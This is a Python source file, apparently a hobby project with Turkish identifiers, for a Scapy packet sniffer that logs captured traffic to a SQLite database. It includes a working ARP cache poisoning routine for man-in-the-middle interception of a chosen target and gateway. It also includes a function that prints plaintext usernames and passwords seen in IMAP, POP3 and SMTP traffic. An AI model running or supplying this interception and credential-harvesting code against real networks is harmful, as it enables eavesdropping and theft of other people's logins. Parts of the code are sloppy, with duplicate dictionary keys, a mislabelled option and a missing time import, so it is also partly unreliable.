from scapy.all import *
from optparse import OptionParser
import threading
import signal
import sys
import sqlite3 as sql
import arayuz


db = sql.connect("veritabani.db")

islem = db.cursor()
islem.execute("""CREATE TABLE IF NOT EXISTS veri
(no, ip_src, ip_dst, protocol, length, info)""")
db.commit()

# Globals
packet_count = 0
INTERFACE = ""
target_ip = ""
target_mac = ""
gateway_ip = ""
gateway_mac = ""
bpf_filter = ""
packet_max = None
poisoning = False
is_poisoned = False
outfile = None
verbose = False

protocols = {
    1: "(ICMP)",
    2: "(IGMP)",
    3: "Gateway-to-Gateway Protocol",
    4: "IP in IP Encapsulation",
    6: "(TCP)",
    17: "(UDP)",
    47: "General Routing Encapsulation (PPTP data over GRE)",
    51: "(AH) IPSec",
    50: "(ESP) IPSec",
    8: "(EGP)",
    3: "Gateway-Gateway Protocol (GGP)",
    20: "Host Monitoring Protocol (HMP)",
    88: "(IGMP)",
    66: "MIT Remote Virtual Disk (RVD)",
    89: "OSPF Open Shortest Path First",
    12: "PARC Universal Packet Protocol (PUP)",
    27: "Reliable Datagram Protocol (RDP)",
    89: "Reservation Protocol (RSVP) QoS"
}

service_guesses = {
    21: "FTP",
    22: "SSH",
    23: "TELNET",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    115: "Simple File Transfer Protocol",
    118: "SQL Services",
    123: "NTP",
    137: "NetBIOS Name Service",
    138: "NetBIOS Datagram Service",
    139: "NetBIOS Session Service",
    143: "IMAP",
    152: "Background File Transfer Protocol (BFTP)",
    156: "SQL Services",
    161: "SNMP",
    194: "IRC",
    199: "SNMP Multiplexing (SMUX)",
    220: "IMAPv3",
    280: "http-mgmt",
    389: "LDAP",
    443: "HTTPS",
    464: "Kerb password change/set",
    500: "ISAKMP/IKE",
    513: "rlogon",
    514: "rshell",
    530: "RPC",
    543: "klogin, Kerberos login",
    544: "kshell, Kerb Remote shell",
    3306: "MySQL",
    5432: "PostgreSQL"
}


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method using send
    print("[+] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
    # return the MAC address
    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning

    poison_target = ARP(op=2,
                        psrc=gateway_ip,
                        pdst=target_ip,
                        hwdst=target_mac)

    poison_gateway = ARP(op=2,
                         psrc=target_ip,
                         pdst=gateway_ip,
                         hwdst=gateway_mac)

    print("[+] Beginning the ARP poisoning.")

    while poisoning:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)

    print("[+] ARP poisoning Finished.")
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    return


# Mail Creds check
def mail_creds(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[+] Server: %s" % packet[IP].dst)
            print("[+] %s" % packet[TCP].payload)


def arp_display(packet):
    if packet[ARP].op == 1:  # who-has (request)
        return "Request: " + packet[ARP].psrc + " is asking about " + packet[ARP].pdst
    if packet[ARP].op == 2:  # is-at (response)
        return "*Response: " + packet[ARP].hwsrc + " has address " + packet[ARP].psrc


## Define Base Action function for sniffer
def packet_recv(packet):
    global packet_count
    global verbose
    global outfile
    packet_count += 1
    # append packet to output file
    if outfile:
        wrpcap(outfile, packet, append=True)
    if verbose:
        packet.show()
    p = packet[0][1]
    try:
        proto_name = protocols[packet.proto]
    except:
        proto_name = "(unknown)"
    svc_guess_local = decode_protocol(p)
    svc_guess_remote = decode_protocol(p, False)
    if svc_guess_remote and svc_guess_remote in ["IMAP", "POP3", "SMTP"]:
        if verbose:
            print("[+] Checking for mail creds")
        mail_creds(packet)
    elif ARP in packet:
        if verbose:
            print("[+] ARP packet being sent to ARP specific function")
        arp_display(packet)

    if hasattr(packet.payload, "src"):
        output = "[%s] %s Packet: %s (%s)  %s (%s)" % (packet_count,
                                                          proto_name,
                                                          p.src,
                                                          svc_guess_local,
                                                          p.dst,
                                                          svc_guess_remote)
    else:
        output = " "

    # no, ip_src, ip_dst, protocol, length, info
    time.sleep(0.5)
    yazdir(packet_count, p.src, p.dst, proto_name, len(p[IP].payload),
           ("(%s)  (%s)" % (svc_guess_local, svc_guess_remote)))
    # return output


def decode_protocol(packet, local=True):
    if local:
        try:
            if packet.sport in service_guesses.keys():
                # in list. convert to likely name
                svc_guess = service_guesses[packet.sport]
            else:
                # not in list, use port nubmer for later analysis
                svc_guess = str(packet.sport)
        except AttributeError:
            svc_guess = None
    else:
        try:
            if packet.dport in service_guesses.keys():
                # in list. convert to likely name
                svc_guess = service_guesses[packet.dport]
            else:
                # not in list, use port nubmer for later analysis
                svc_guess = str(packet.dport)
        except AttributeError:
            svc_guess = None
    return svc_guess


def signal_handler(signal, frame):
    global poisoning
    if poisoning:
        print("\n[+] Shutting Down ARP poisoning.")
        poisoning = False
        time.sleep(1)
    print("[+] Goodbye, Dr. Falken :)\n")
    sys.exit(0)


def yazdir(no, ip_src, ip_dst, protocol, length, info):


    islem.execute("INSERT INTO veri (no, ip_src, ip_dst, protocol, length, info) VALUES  (?, ?, ?,?, ?, ?)",(no, ip_src, ip_dst, protocol, length, info))
    db.commit()

if __name__ == '__main__':
    for a in range(300):
        signal.signal(signal.SIGINT, signal_handler)
        parser = OptionParser()
        parser.add_option("-a", "--arp-poison", dest="ARPPoison", action="store_true", default=False,
                          help="Try to Poison ARP cache for MITM")
        parser.add_option("-i", "--iface", dest="iface", default=None,
                          help="The network interface to bind to.")
        parser.add_option("-t", "--target", dest="targetIP", default=None,
                          help="The target IP for ARP Poisoning")
        parser.add_option("-g", "--gate-way", dest="gateIP", default=None,
                          help="The Gateway IP for ARP Poisoning")
        parser.add_option("-n", "--max-num", dest="N", default=None,
                          help="Stop Capture after N packets")
        parser.add_option("-f", "--filter", dest="filter", default="ip",
                          help="Add a custom BPF (Wireshark-style Packet Filter)")
        parser.add_option("-o", "--out-file", dest="fileName", default=None,
                          help="Add a custom BPF (Wireshark-style Packet Filter)")
        parser.add_option("-v", "--verbose", dest="verb", action="store_true", default=False,
                          help="Display packet contents verbosely")

        (options, args) = parser.parse_args()
        if options.iface:
            INTERFACE = options.iface.strip()
        if options.fileName:
            outfile = options.fileName

        if options.filter:
            bpf_filter = options.filter
        if options.verb:
            verbose = True
        # ARP Poison?
        if options.ARPPoison:
            poisoning = True
            try:
                gateway_ip = options.gateIP
                target_ip = options.targetIP
                gateway_mac = get_mac(gateway_ip)
                target_mac = get_mac(target_ip)
                if gateway_mac is None:
                    print("[-] Failed to get Gateway MAC. Exiting.")
                    exit(1)
                else:
                    print("[+] Gateway %s is at %s" % (gateway_ip, gateway_mac))

                if target_mac is None:
                    print("[-] Failed to get Target MAC. Exiting.")
                    exit(1)
                else:
                    print("[+] Target %s is at %s" % (target_ip, target_mac))
                    # Start the poisoning thread
                    conf.iface = INTERFACE
                    conf.verb = 0
                    t = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
                    t.daemon = True
                    t.start()
            except Exception as e:
                print("[-] ARP poisoning Failed")
                print(e)
                exit(1)

        # Start capturing
        se = INTERFACE or "all interfaces"
        print("[+] Beginning Capture on: %s" % se)
        # Setup sniffering for traffic
        if options.N:
            packet_max = int(options.N)
            print("[+] Limiting capture to %d packets" % packet_max)
            packets = sniff(filter=bpf_filter,
                            iface=INTERFACE,
                            prn=packet_recv,
                            count=packet_max)
            # write out the captured packets
            print("[+] Writing packets to %s" % outfile)
            wrpcap(outfile, packets)
        else:
            sniff(filter=bpf_filter, iface=options.iface, prn=packet_recv, store=0)